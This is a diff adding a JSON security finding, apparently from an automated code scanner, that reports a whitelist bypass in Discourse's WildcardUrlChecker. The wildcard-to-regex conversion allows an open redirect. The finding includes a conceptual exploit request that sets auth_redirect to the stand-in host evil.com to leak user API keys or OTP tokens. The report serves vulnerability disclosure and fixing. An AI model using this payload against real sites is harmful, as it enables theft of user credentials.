@@ -1,0 +1,23 @@
+[
+  {
+    "FindingID": "a0806f75-e079-5cb6-8cd8-591c9eb2bbbd",
+    "SessionID": "ChBmNTVlZmVmOTZjYTZlYzY4EAgaATAqBG1haW4",
+    "Title": "Redirection Whitelist Bypass in WildcardUrlChecker leading to Open Redirect and Token Leakage",
+    "FilePath": "app/services/wildcard_url_checker.rb",
+    "Severity": "HIGH",
+    "Confidence": 100,
+    "Analysis": "The `WildcardUrlChecker.check_url` method validates URLs against a whitelist with support for wildcard (`*`) domains. However, when converting the wildcard to a regular expression, it replaces `*` with `\\S*` (matching any non-whitespace characters, including slashes). \n\nWhen a pattern like `https://*.discourse.org` is configured, the resulting regular expression is `\\Ahttps://\\S*\\.discourse\\.org\\z`. \n\nAn attacker can bypass this check by supplying an `auth_redirect` URL of the form:\n`https://evil.com/bypass.discourse.org`\n\nIn this URL, the host is `evil.com`, and `/bypass.discourse.org` is the path. Since there are no spaces in the URL, `\\S*` successfully matches `evil.com/bypass`, and the overall regex matches. This allows attackers to redirect authenticated sessions and leak sensitive user API keys or OTP tokens to an external server.\n\n### Conceptual Exploit Payload\nTo trigger an open redirect or leak a user API key:\n1. Send a request to `/user-api-key/new` or trigger `redirect_to_login_if_required` with parameters:\n   `?user_api_public_key=[valid_rsa_key]\u0026auth_redirect=https://evil.com/bypass.discourse.org`\n2. The check passes, and the user is redirected to `https://evil.com/bypass.discourse.org?otp=true` or with `payload=...` containing the base64-encoded encrypted User API Key.",
+    "Snippet": "  def self.check_url(url, url_to_check)\n    return false if !valid_url?(url_to_check)\n\n    escaped_url = Regexp.escape(url).sub(\"\\\\*\", '\\\\S*')\n    url_regex = Regexp.new(\"\\\\A#{escaped_url}\\\\z\", \"i\")\n\n    url_to_check.match?(url_regex)\n  end",
+    "VulnType": "CWE-601",
+    "VulnID": "CWE-601",
+    "Fingerprint": "",
+    "Status": "OPEN",
+    "SourceStage": "",
+    "FindingJSON": "",
+    "UpdatedAt": "",
+    "StartLine": 4,
+    "EndLine": 11,
+    "DismissReason": "",
+    "ConfidenceLevel": ""
+  }
+]
